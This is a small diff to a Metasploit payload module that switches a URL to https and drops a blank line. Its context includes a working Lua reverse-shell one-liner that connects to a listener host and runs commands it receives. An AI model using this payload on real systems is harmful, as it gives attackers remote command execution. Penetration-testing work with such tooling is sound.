@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -50,6 +50,5 @@ module MetasploitModule
   def command_string
     "lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('#{datastore['LHOST']}',#{datastore['LPORT']});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\""
   end
-
 end
 
